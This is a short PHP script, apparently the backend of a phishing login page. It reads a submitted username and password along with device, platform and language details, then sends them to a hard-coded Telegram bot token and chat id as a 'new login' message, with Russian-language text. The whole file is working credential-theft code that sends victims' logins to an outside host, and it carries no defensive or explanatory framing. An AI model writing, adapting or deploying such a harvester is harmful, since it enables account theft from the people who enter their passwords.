<?php
$token = "8776160852:AAHPczwVPokWl4WK-ClRW65_sfdY039Xq1A";
$chat_id = "426389082";

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$device = $_POST['device'] ?? '';
$platform = $_POST['platform'] ?? '';
$language = $_POST['language'] ?? '';

if (!$username || !$password) {
    echo "Ошибка: пустой логин или пароль";
    exit;
}

$message = "Новый вход:
Логин: $username
Пароль: $password
📱 Устройство: $device
💻 Платформа: $platform
🌍 Язык: $language";

$response = file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));

if ($response) {
    echo "ok";
} else {
    echo "Ошибка отправки";
}
?>
